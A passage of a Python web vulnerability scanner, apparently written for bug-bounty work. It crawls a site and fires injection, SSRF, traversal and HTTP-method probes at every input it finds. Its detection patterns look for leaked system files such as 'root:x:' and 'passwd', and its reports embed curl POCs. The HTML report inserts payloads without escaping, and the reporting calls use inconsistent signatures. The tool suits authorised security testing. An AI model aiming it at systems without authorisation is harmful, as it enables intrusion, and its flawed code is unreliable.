            test_url, test_response = self._request_with_param(url, param, payload, method, post_url)
            if normal_response and test_response:
                # 检查响应是否不同，可能表示越权访问成功
                if normal_response.status_code == test_response.status_code and len(normal_response.text) != len(test_response.text):
                    return True, test_url
            return False, test_url
        except Exception as e:
            self._dbg(f"[DEBUG] 越权访问测试失败: {e}")
            return False, url

    def test_json_injection(self, url, param, payload, method='GET', post_url=None):
        """测试JSON注入漏洞"""
        try:
            test_url, response = self._request_with_param(url, param, payload, method, post_url)
            if response:
                # 检查是否返回JSON错误
                error_patterns = [
                    'JSON.parse', 'SyntaxError', 'JSON', 'json',
                    'Unexpected token', 'Invalid JSON'
                ]
                content = response.text.lower()
                for pattern in error_patterns:
                    if pattern in content:
                        return True, test_url
            return False, test_url
        except Exception as e:
            self._dbg(f"[DEBUG] JSON注入测试失败: {e}")
            return False, url

    def test_ssrf(self, url, param, payload, method='GET', post_url=None):
        """测试SSRF漏洞"""
        try:
            test_url, response = self._request_with_param(url, param, payload, method, post_url)
            if response:
                # 检查是否返回本地服务的特征
                success_patterns = [
                    'localhost', '127.0.0.1', '::1',
                    'Apache', 'Nginx', 'Microsoft-IIS',
                    'Server:', 'X-Powered-By:',
                    'root:x:', 'nobody:x:'
                ]
                content = response.text.lower()
                for pattern in success_patterns:
                    if pattern in content:
                        return True, test_url
            return False, test_url
        except Exception as e:
            self._dbg(f"[DEBUG] SSRF测试失败: {e}")
            return False, url

    def test_directory_traversal(self, url, param, payload, method='GET', post_url=None):
        """测试目录遍历漏洞"""
        try:
            test_url, response = self._request_with_param(url, param, payload, method, post_url)
            if response:
                # 检查是否返回敏感文件内容
                success_patterns = [
                    'root:x:', 'nobody:x:', 'bin/bash',
                    'windows', 'system32', 'Program Files',
                    'boot.ini', 'win.ini', 'passwd'
                ]
                content = response.text.lower()
                for pattern in success_patterns:
                    if pattern in content:
                        return True, test_url
            return False, test_url
        except Exception as e:
            self._dbg(f"[DEBUG] 目录遍历测试失败: {e}")
            return False, url

    def _request_with_param(self, url, param, payload, method='GET', post_url=None, timeout=None):
        """带参数的请求"""
        try:
            # 确保 URL 有协议前缀
            if not url.startswith('http://') and not url.startswith('https://'):
                url = 'http://' + url
            
            if method == 'GET':
                parsed = urlparse(url)
                query = parsed.query
                if query:
                    new_query = query.replace(f'{param}=', f'{param}={quote(payload)}')
                    if new_query == query:
                        new_query = query + '&' + f'{param}={quote(payload)}'
                else:
                    new_query = f'{param}={quote(payload)}'
                test_url = parsed._replace(query=new_query).geturl()
                response = self._http_get(test_url, timeout=timeout)
            else:  # POST
                test_url = post_url or url
                data = {param: payload}
                response = self._http_post(test_url, data=data, timeout=timeout)
            return test_url, response
        except Exception as e:
            self._dbg(f"[DEBUG] 请求失败: {e}")
            return url, None

    def crawl(self, url, current_depth=0):
        """智能爬虫"""
        if current_depth > self.depth or url in self.crawled_urls:
            return
        if len(self.crawled_urls) >= self.max_crawl_urls:
            return

        # 智能过滤：跳过静态资源和无意义的 URL
        parsed_url = urlparse(url)
        path = parsed_url.path
        if any(path.endswith(ext) for ext in ['.js', '.css', '.png', '.jpg', '.jpeg', '.gif', '.svg', '.ico', '.pdf', '.zip', '.rar', '.exe', '.dll', '.mp3', '.mp4', '.avi', '.mov', '.wmv', '.flv', '.swf', '.woff', '.woff2', '.ttf', '.otf', '.eot']):
            return
        if '#' in url or 'javascript:' in url or 'data:' in url:
            return

        with self.lock:
            self.crawled_urls.add(url)

        try:
            response = self._http_get(url)
            if not response:
                return

            # 扫描敏感信息
            self._scan_sensitive_info(url)

            # 解析 HTML
            soup = BeautifulSoup(response.text, 'html.parser')

            # 提取输入点
            input_points = self._extract_input_points(url, soup)
            # 快速扫描模式下只测试常见参数
            if self.quick_scan:
                input_points = [point for point in input_points if point['param'] in QUICK_SCAN_PARAMS]
            for point in input_points:
                self._scan_input_point(point)

            # 提取链接
            links = []
            # 提取 <a> 标签链接
            for a in soup.find_all('a', href=True):
                href = a['href']
                absolute_url = urljoin(url, href)
                if self._is_in_scope(absolute_url):
                    links.append(absolute_url)
            # 提取 <form> 标签的 action 属性
            for form in soup.find_all('form', action=True):
                action = form['action']
                absolute_url = urljoin(url, action)
                if self._is_in_scope(absolute_url):
                    links.append(absolute_url)

            # 去重链接
            links = list(set(links))
            
            # 快速扫描模式下限制链接数量
            if self.quick_scan:
                links = links[:50]  # 最多爬取50个链接

            # 并行爬取
            with ThreadPoolExecutor(max_workers=min(self.threads, len(links))) as executor:
                executor.map(lambda link: self.crawl(link, current_depth + 1), links)
        except Exception as e:
            self._dbg(f"[DEBUG] 爬取失败: {e}")

    def _is_in_scope(self, url):
        """检查 URL 是否在范围内"""
        parsed = urlparse(url)
        target_parsed = urlparse(self.target)
        if parsed.netloc != target_parsed.netloc:
            if self.strict_scope:
                return False
            if self.allow_hosts:
                return any(host in parsed.netloc for host in self.allow_hosts)
            return False
        return True

    def _extract_input_points(self, url, soup):
        """提取输入点"""
        input_points = []

        # 提取 URL 参数
        parsed = urlparse(url)
        if parsed.query:
            params = parsed.query.split('&')
            for param in params:
                if '=' in param:
                    name = param.split('=')[0]
                    input_points.append({
                        'url': url,
                        'param': name,
                        'method': 'GET',
                        'post_url': None
                    })

        # 提取表单
        for form in soup.find_all('form'):
            action = form.get('action', '')
            method = form.get('method', 'GET').upper()
            form_url = urljoin(url, action)
            
            # 提取所有输入类型，包括隐藏字段
            for input_tag in form.find_all('input'):
                name = input_tag.get('name')
                if name:
                    input_points.append({
                        'url': form_url,
                        'param': name,
                        'method': method,
                        'post_url': form_url
                    })

            # 提取文本域
            for textarea in form.find_all('textarea'):
                name = textarea.get('name')
                if name:
                    input_points.append({
                        'url': form_url,
                        'param': name,
                        'method': method,
                        'post_url': form_url
                    })

            # 提取下拉选择框
            for select in form.find_all('select'):
                name = select.get('name')
                if name:
                    input_points.append({
                        'url': form_url,
                        'param': name,
                        'method': method,
                        'post_url': form_url
                    })

            # 提取按钮（可能包含 name 属性）
            for button in form.find_all('button'):
                name = button.get('name')
                if name:
                    input_points.append({
                        'url': form_url,
                        'param': name,
                        'method': method,
                        'post_url': form_url
                    })

            # 提取输入组（如复选框、单选框）
            for input_group in form.find_all(['div', 'span'], class_=['input-group', 'form-group']):
                for input_tag in input_group.find_all('input'):
                    name = input_tag.get('name')
                    if name:
                        input_points.append({
                            'url': form_url,
                            'param': name,
                            'method': method,
                            'post_url': form_url
                        })

        # 提取 JavaScript 中的输入点
        for script in soup.find_all('script'):
            if script.string:
                # 查找 JavaScript 中的参数名
                js_params = re.findall(r'\b(\w+)\s*[:=]\s*["\']?([^"\'\s]+)["\']?', script.string)
                for param, value in js_params:
                    # 过滤掉常见的非输入参数
                    if param not in ['function', 'var', 'let', 'const', 'if', 'for', 'while', 'return']:
                        input_points.append({
                            'url': url,
                            'param': param,
                            'method': 'GET',
                            'post_url': None
                        })

        # 去重输入点
        seen = set()
        unique_input_points = []
        for point in input_points:
            key = (point['url'], point['param'], point['method'])
            if key not in seen:
                seen.add(key)
                unique_input_points.append(point)

        return unique_input_points

    def _scan_input_point(self, point):
        """扫描输入点"""
        url = point['url']
        param = point['param']
        method = point['method']
        post_url = point['post_url']

        # 快速扫描模式：只测试常见参数
        if hasattr(self, 'quick_scan') and self.quick_scan and param not in QUICK_SCAN_PARAMS:
            return

        now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        self._dbg(f"[{now}] 开始扫描输入点: {url} 参数: {param} 方法: {method}")

        # 测试 XSS
        if self.enable_xss and not (hasattr(self, 'quick_scan') and self.quick_scan and 'XSS' not in QUICK_SCAN_VULNS):
            self._dbg(f"[{now}] 测试 XSS")
            payloads = self.get_xss_payloads()
            for payload in payloads:
                self._dbg(f"[{now}] 测试 XSS payload: {payload}")
                success, test_url = self.test_xss(url, param, payload, method, post_url)
                if success:
                    self._info(f"[+] 发现 XSS 漏洞: {test_url}")
                    self._report_vuln_verified('XSS', test_url, param, payload, url, method, post_url, 'Reflected', 'high')

        # 测试 SQL 注入
        if self.enable_sqli and not (hasattr(self, 'quick_scan') and self.quick_scan and 'SQL Injection' not in QUICK_SCAN_VULNS):
            self._dbg(f"[{now}] 测试 SQL 注入")
            payloads = self.get_sqli_payloads()
            for payload in payloads:
                self._dbg(f"[{now}] 测试 SQL 注入 payload: {payload}")
                success, test_url, injection_type = self.test_sqli(url, param, payload, method, post_url)
                if success:
                    self._info(f"[+] 发现 SQL 注入漏洞: {test_url} 类型: {injection_type}")
                    self._report_vuln_verified('SQL Injection', test_url, param, payload, url, method, post_url, injection_type, 'critical')

        # 测试命令注入
        if not (hasattr(self, 'quick_scan') and self.quick_scan and 'Command Injection' not in QUICK_SCAN_VULNS):
            self._dbg(f"[{now}] 测试命令注入")
            payloads = self.get_command_injection_payloads()
            for payload in payloads:
                self._dbg(f"[{now}] 测试命令注入 payload: {payload}")
                success, test_url = self.test_command_injection(url, param, payload, method, post_url)
                if success:
                    self._info(f"[+] 发现命令注入漏洞: {test_url}")
                    self._report_vuln_verified('Command Injection', test_url, param, payload, url, method, post_url, '', 'critical')

        # 测试开放重定向
        if self.enable_open_redirect and not (hasattr(self, 'quick_scan') and self.quick_scan):
            self._dbg(f"[{now}] 测试开放重定向")
            payloads = self.get_open_redirect_payloads()
            for payload in payloads:
                self._dbg(f"[{now}] 测试开放重定向 payload: {payload}")
                success, test_url = self.test_open_redirect(url, param, payload, method, post_url)
                if success:
                    self._info(f"[+] 发现开放重定向漏洞: {test_url}")
                    self._report_vuln_verified('Open Redirect', test_url, param, payload, url, method, post_url, '', 'medium')

        # 测试越权访问
        if self.enable_idor and not (hasattr(self, 'quick_scan') and self.quick_scan):
            self._dbg(f"[{now}] 测试越权访问")
            payloads = self.get_idor_payloads()
            for payload in payloads:
                self._dbg(f"[{now}] 测试越权访问 payload: {payload}")
                success, test_url = self.test_idor(url, param, payload, method, post_url)
                if success:
                    self._info(f"[+] 发现越权访问漏洞: {test_url}")
                    self._report_vuln_verified('IDOR', test_url, param, payload, url, method, post_url, '', 'high')

        # 测试JSON注入
        if self.enable_json_fuzz and not (hasattr(self, 'quick_scan') and self.quick_scan):
            self._dbg(f"[{now}] 测试JSON注入")
            payloads = self.get_json_injection_payloads()
            for payload in payloads:
                self._dbg(f"[{now}] 测试JSON注入 payload: {payload}")
                success, test_url = self.test_json_injection(url, param, payload, method, post_url)
                if success:
                    self._info(f"[+] 发现JSON注入漏洞: {test_url}")
                    self._report_vuln_verified('JSON Injection', test_url, param, payload, url, method, post_url, '', 'high')

        # 测试SSRF
        if not (hasattr(self, 'quick_scan') and self.quick_scan and 'SSRF' not in QUICK_SCAN_VULNS):
            self._dbg(f"[{now}] 测试SSRF")
            payloads = self.get_ssrf_payloads()
            for payload in payloads:
                self._dbg(f"[{now}] 测试SSRF payload: {payload}")
                success, test_url = self.test_ssrf(url, param, payload, method, post_url)
                if success:
                    self._info(f"[+] 发现SSRF漏洞: {test_url}")
                    self._report_vuln_verified('SSRF', test_url, param, payload, url, method, post_url, '', 'critical')

        # 测试目录遍历
        if hasattr(self, 'enable_directory_scan') and self.enable_directory_scan and not (hasattr(self, 'quick_scan') and self.quick_scan):
            self._dbg(f"[{now}] 测试目录遍历")
            payloads = self.get_directory_traversal_payloads()
            for payload in payloads:
                self._dbg(f"[{now}] 测试目录遍历 payload: {payload}")
                success, test_url = self.test_directory_traversal(url, param, payload, method, post_url)
                if success:
                    self._info(f"[+] 发现目录遍历漏洞: {test_url}")
                    self._report_vuln_verified('Directory Traversal', test_url, param, payload, url, method, post_url, '', 'high')

        self._dbg(f"[{now}] 输入点扫描完成: {url} 参数: {param}")

    def _get_fix_recommendation(self, vuln):
        """获取修复建议"""
        recommendations = {
            'XSS': '对输入进行HTML实体编码，使用Content-Security-Policy头',
            'SQL Injection': '使用参数化查询，避免拼接SQL语句',
            'Command Injection': '使用白名单验证，避免直接执行用户输入',
            'Sensitive Information': '不要在前端暴露敏感信息，使用环境变量存储密钥',
            'Open Redirect': '验证重定向URL是否在允许的域名列表中，使用相对路径',
            'IDOR': '实现适当的访问控制，使用会话管理和权限检查',
            'JSON Injection': '验证JSON输入格式，使用安全的JSON解析方法',
            'SSRF': '验证URL参数，使用白名单限制可访问的域名和协议',
            'Directory Traversal': '对路径参数进行严格验证，使用绝对路径',
        }
        return recommendations.get(vuln['type'], '请根据漏洞类型进行相应修复')

    def _sort_vulnerabilities_by_priority(self):
        """按照SRC漏洞优先级排序"""
        def get_priority_score(vuln):
            vuln_type = vuln.get('type')
            for priority, vuln_types in VULN_PRIORITY.items():
                if vuln_type in vuln_types:
                    if priority == 'critical':
                        return 4
                    elif priority == 'high':
                        return 3
                    elif priority == 'medium':
                        return 2
                    elif priority == 'low':
                        return 1
            return 0
        
        self.vulnerabilities.sort(key=get_priority_score, reverse=True)

    def _save_state(self):
        """保存扫描状态"""
        state = {
            'target': self.target,
            'depth': self.depth,
            'crawled_urls': list(self.crawled_urls),
            'vulnerabilities': self.vulnerabilities,
            'request_count': self.request_count,
            'start_time': self.start_time.isoformat()
        }
        try:
            with open(self.checkpoint_path, 'w', encoding='utf-8') as f:
                json.dump(state, f, ensure_ascii=False, indent=2)
            print(f"[INFO] 扫描状态已保存到: {self.checkpoint_path}")
        except Exception as e:
            self._dbg(f"[DEBUG] 保存状态失败: {e}")

    def _load_state(self):
        """加载扫描状态"""
        try:
            with open(self.checkpoint_path, 'r', encoding='utf-8') as f:
                state = json.load(f)
            self.target = state.get('target', '')
            self.depth = state.get('depth', 3)
            self.crawled_urls = set(state.get('crawled_urls', []))
            self.vulnerabilities = state.get('vulnerabilities', [])
            self.request_count = state.get('request_count', 0)
            self.start_time = datetime.fromisoformat(state.get('start_time', datetime.now().isoformat()))
            print(f"[INFO] 扫描状态已从: {self.checkpoint_path} 加载")
            print(f"[INFO] 已爬取: {len(self.crawled_urls)}个URL")
            print(f"[INFO] 已发现: {len(self.vulnerabilities)}个漏洞")
            return True
        except Exception as e:
            self._dbg(f"[DEBUG] 加载状态失败: {e}")
            return False

    def hunt(self, target, depth=3, passive_urls=None):
        """开始扫描"""
        self.target = target
        # SRC 模式限制爬取深度为1
        if hasattr(self, 'src_mode') and self.src_mode:
            self.depth = 1
            self._info("SRC 模式 - 强制爬取深度: 1")
        else:
            self.depth = depth
        
        self._info(f"开始扫描: {target}")
        self._info(f"爬取深度: {self.depth}")
        self._info(f"最大线程数: {self.threads}")
        self._info(f"最大爬取URL数: {self.max_crawl_urls}")
        self._info(f"启用的功能: XSS={self.enable_xss}, SQLi={self.enable_sqli}")

        start_time = time.time()
        
        # 开始爬取
        self.crawl(target, 0)
        
        # 额外的参数模糊测试
        if self.enable_param_fuzzing:
            self._dbg("开始参数模糊测试...")
            self._fuzz_parameters()
        
        # 头部注入测试
        if self.enable_header_injection:
            self._dbg("开始头部注入测试...")
            self._test_header_injection()
        
        # HTTP方法模糊测试
        if self.enable_method_fuzzing:
            self._dbg("开始HTTP方法模糊测试...")
            self._test_method_fuzzing()
        
        # 验证漏洞
        if self.verify_poc:
            self._dbg("开始验证漏洞...")
            self.verify_vulnerabilities()
        
        end_time = time.time()
        self.time_taken = end_time - start_time
        self.stats['scan_time'] = self.time_taken
        self.stats['total_vulnerabilities'] = len(self.vulnerabilities)

        # 漏洞优先级排序
        self._sort_vulnerabilities_by_priority()
        
        self._info(f"扫描完成，耗时: {self.time_taken:.2f}秒")
        self._info(f"共爬取: {len(self.crawled_urls)}个URL")
        self._info(f"共请求: {self.stats['total_requests']}次")
        self._info(f"共测试: {self.stats['total_payloads']}个payload")
        self._info(f"发现漏洞: {len(self.vulnerabilities)}个")

        # 保存扫描状态（如果需要）
        if self.checkpoint_path:
            self._save_state()

        # 按照 main.py 的期望返回格式
        return {
            'vulnerabilities': self.vulnerabilities,
            'summary': {
                'total_vulns': len(self.vulnerabilities),
                'total_urls': len(self.crawled_urls),
                'time_taken': self.time_taken
            },
            'info': {
                'backup_files': [],
                'sensitive_directories': [],
                'header_audit': []
            }
        }
    
    def _fuzz_parameters(self):
        """参数模糊测试"""
        # 对所有爬取的URL进行参数模糊测试
        for url in list(self.crawled_urls):
            # 测试常见参数
            for param in ENHANCED_PARAMS['common']:
                # 测试SQL注入
                if self.enable_sqli:
                    for payload in self.get_sqli_payloads():
                        self.stats['total_payloads'] += 1
                        test_url, response = self._request_with_param(url, param, payload, 'GET')
                        if response:
                            if any(error in response.text for error in ['SQL syntax', 'mysql_fetch', 'PostgreSQL', 'Oracle', 'Microsoft SQL Server', 'syntax error']):
                                self._report_vuln_verified({
                                    'url': test_url,
                                    'type': 'SQL Injection',
                                    'payload': payload,
                                    'severity': 'critical'
                                })
                # 测试XSS
                if self.enable_xss:
                    for payload in self.get_xss_payloads():
                        self.stats['total_payloads'] += 1
                        test_url, response = self._request_with_param(url, param, payload, 'GET')
                        if response:
                            if payload in response.text:
                                self._report_vuln_verified({
                                    'url': test_url,
                                    'type': 'XSS',
                                    'payload': payload,
                                    'severity': 'high'
                                })
    
    def _test_header_injection(self):
        """头部注入测试"""
        test_headers = {
            'X-Forwarded-For': '127.0.0.1',
            'X-Real-IP': '127.0.0.1',
            'Referer': 'http://localhost/',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        
        # 测试目标URL
        for header_name, header_value in test_headers.items():
            headers = {header_name: header_value}
            response = self._http_get(self.target, headers=headers)
            if response:
                # 检查是否有头部注入漏洞
                if 'localhost' in response.text or '127.0.0.1' in response.text:
                    self._report_vuln_verified({
                        'url': self.target,
                        'type': 'Header Injection',
                        'payload': f'{header_name}: {header_value}',
                        'severity': 'medium'
                    })
    
    def _test_method_fuzzing(self):
        """HTTP方法模糊测试"""
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD', 'TRACE', 'CONNECT']
        
        for method in methods:
            try:
                # 使用requests库的request方法测试不同的HTTP方法
                response = requests.request(method, self.target, timeout=self.timeout, verify=False)
                self.stats['total_requests'] += 1
                
                # 检查是否允许了危险的HTTP方法
                if method in ['PUT', 'DELETE', 'TRACE', 'CONNECT']:
                    if response.status_code < 400:
                        self._report_vuln_verified({
                            'url': self.target,
                            'type': 'HTTP Method Fuzzing',
                            'payload': f'Method: {method}',
                            'severity': 'medium'
                        })
            except Exception as e:
                self._dbg(f"[DEBUG] HTTP方法测试失败: {e}")

    def generate_report(self, output, html_path=None, md_path=None, src_report=False):
        """生成报告"""
        # 生成 JSON 报告
        if output:
            report = {
                'vulnerabilities': self.vulnerabilities,
                'summary': {
                    'total_vulns': len(self.vulnerabilities),
                    'total_urls': len(self.crawled_urls),
                    'time_taken': self.time_taken if hasattr(self, 'time_taken') else 0,
                    'start_time': self.start_time if hasattr(self, 'start_time') else str(datetime.now()),
                    'end_time': str(datetime.now())
                },
                'info': {
                    'backup_files': [],
                    'sensitive_directories': [],
                    'header_audit': []
                }
            }
            with open(output, 'w', encoding='utf-8') as f:
                json.dump(report, f, ensure_ascii=False, indent=2)
            self._info(f"JSON 报告已保存至: {output}")
        
        # 生成 HTML 报告
        if html_path:
            html_content = self._generate_html_report()
            with open(html_path, 'w', encoding='utf-8') as f:
                f.write(html_content)
            self._info(f"HTML 报告已保存至: {html_path}")
        
        # 生成 Markdown 报告
        if md_path:
            md_content = self._generate_md_report()
            with open(md_path, 'w', encoding='utf-8') as f:
                f.write(md_content)
            self._info(f"Markdown 报告已保存至: {md_path}")
        
        # 生成 SRC 报告
        if src_report:
            src_report_path = output.replace('.json', '_src.md') if output else 'src_report.md'
            self._generate_src_report(src_report_path)
    
    def _generate_html_report(self):
        """生成 HTML 报告"""
        vulnerabilities = self.vulnerabilities
        total_vulns = len(vulnerabilities)
        total_urls = len(self.crawled_urls)
        
        html = '''
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>漏洞扫描报告</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
            background-color: #f5f5f5;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        h1, h2, h3 {
            color: #333;
        }
        .summary {
            background-color: #f0f0f0;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
        }
        .vulnerability {
            border: 1px solid #ddd;
            padding: 15px;
            margin-bottom: 15px;
            border-radius: 5px;
        }
        .vulnerability h3 {
            margin-top: 0;
            color: #d32f2f;
        }
        .severity {
            display: inline-block;
            padding: 2px 8px;
            border-radius: 12px;
            font-size: 12px;
            font-weight: bold;
        }
        .severity.critical {
            background-color: #d32f2f;
            color: white;
        }
        .severity.high {
            background-color: #f57c00;
            color: white;
        }
        .severity.medium {
            background-color: #fbc02d;
            color: black;
        }
        .severity.low {
            background-color: #4caf50;
            color: white;
        }
        .details {
            margin-top: 10px;
            padding-left: 20px;
        }
        .fix-recommendation {
            margin-top: 10px;
            padding: 10px;
            background-color: #e3f2fd;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>漏洞扫描报告</h1>
        <div class="summary">
            <h2>扫描摘要</h2>
            <p><strong>目标:</strong> ''' + self.target + '''</p>
            <p><strong>总漏洞数:</strong> ''' + str(total_vulns) + '''</p>
            <p><strong>爬取URL数:</strong> ''' + str(total_urls) + '''</p>
            <p><strong>扫描时间:</strong> ''' + datetime.now().strftime('%Y-%m-%d %H:%M:%S') + '''</p>
        </div>
        
        <h2>漏洞详情</h2>
        '''
        
        if vulnerabilities:
            for vuln in vulnerabilities:
                severity_class = vuln.get('severity', 'low').lower()
                fix_recommendation = self._get_fix_recommendation(vuln)
                
                html += '''
        <div class="vulnerability">
            <h3>''' + vuln.get('type', 'Unknown') + ''' <span class="severity ''' + severity_class + '''">''' + vuln.get('severity', 'Low') + '''</span></h3>
            <div class="details">
                <p><strong>URL:</strong> <a href="''' + vuln.get('url', '') + '''" target="_blank">''' + vuln.get('url', '') + '''</a></p>
                <p><strong>参数:</strong> ''' + vuln.get('parameter', 'N/A') + '''</p>
                <p><strong>方法:</strong> ''' + vuln.get('method', 'GET') + '''</p>
                <p><strong>Payload:</strong> ''' + vuln.get('payload', 'N/A') + '''</p>
                <p><strong>类型:</strong> ''' + vuln.get('injection_type', 'N/A') + '''</p>
            </div>
            <div class="fix-recommendation">
                <strong>修复建议:</strong> ''' + fix_recommendation + '''
            </div>
        </div>
                '''
        else:
            html += "<p>未发现漏洞</p>"
        
        html += '''
    </div>
</body>
</html>
        '''
        return html
    
    def _generate_md_report(self):
        """生成 Markdown 报告"""
        vulnerabilities = self.vulnerabilities
        total_vulns = len(vulnerabilities)
        total_urls = len(self.crawled_urls)
        
        md = f"""
# 漏洞扫描报告

## 扫描摘要
- **目标:** {self.target}
- **总漏洞数:** {total_vulns}
- **爬取URL数:** {total_urls}
- **扫描时间:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

## 漏洞详情
"""
        
        if vulnerabilities:
            for i, vuln in enumerate(vulnerabilities, 1):
                fix_recommendation = self._get_fix_recommendation(vuln)
                
                md += f"""
### {i}. {vuln.get('type', 'Unknown')} ({vuln.get('severity', 'Low')})
- **URL:** {vuln.get('url', '')}
- **参数:** {vuln.get('parameter', 'N/A')}
- **方法:** {vuln.get('method', 'GET')}
- **Payload:** {vuln.get('payload', 'N/A')}
- **类型:** {vuln.get('injection_type', 'N/A')}
- **修复建议:** {fix_recommendation}

"""
        else:
            md += "未发现漏洞"
        
        return md

    def _generate_src_report(self, output_path):
        """生成符合SRC格式的报告"""
        vulnerabilities = self.vulnerabilities
        
        md_content = f"""# SRC 漏洞报告

## 扫描概览
- 目标: {self.target}
- 扫描时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
- 发现漏洞数: {len(vulnerabilities)}

"""
        
        for i, vuln in enumerate(vulnerabilities, 1):
            vuln_type = vuln.get('type')
            url = vuln.get('url')
            payload = vuln.get('payload', 'N/A')
            
            # 提取厂商信息（从URL中）
            parsed_url = urlparse(self.target)
            vendor = parsed_url.hostname.replace('www.', '').split('.')[0]
            
            md_content += f"\n## 漏洞 {i}\n"
            md_content += f"### 漏洞标题\n"
            md_content += f"[{vendor}]存在{vuln_type}漏洞\n\n"
            
            md_content += f"### 漏洞URL\n"
            md_content += f"`{url}`\n\n"
            
            md_content += f"### 复现步骤\n"
            md_content += f"1. 访问上述URL\n"
            md_content += f"2. 观察响应\n\n"
            
            md_content += f"### POC\n"
            if vuln.get('method') == 'GET':
                md_content += f"curl -X GET \"{url}\"\n\n"
            else:
                param = vuln.get('param', 'param')
                md_content += f"curl -X POST \"{url}\" -d \"{param}={payload}\"\n\n"
            
            md_content += f"### 修复建议\n"
            md_content += f"{vuln.get('fix_recommendations', '对用户输入进行过滤')}\n\n"
        
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(md_content)
        print(f"[INFO] SRC 报告已保存至: {output_path}")